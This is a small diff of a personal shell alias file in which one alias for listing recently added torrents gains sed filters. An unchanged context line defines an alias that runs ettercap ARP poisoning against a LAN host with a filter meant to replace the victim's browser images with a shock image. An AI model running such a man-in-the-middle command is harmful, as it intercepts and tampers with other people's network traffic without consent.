@@ -35,4 +35,4 @@ alias change_to_good_graphics_mode='docky &; compiz --replace &'
 
 # ettercap command to replace all images in a browser with something (tubgirl...)
 alias wreck_your_buzz='sudo ettercap -i eth1 -T -q -F ~/tools/dos.ef -M ARP /192.168.1.5/ //'
-alias sbrecent='grep -h "Added torrent" $HOME/log/spiderbro/*.log'
+alias sbrecent='grep -h "Added torrent" $HOME/log/spiderbro/*.log | sed -e "s/&tr.*$//g" | sed -e "s/magnet.*dn=//g"'
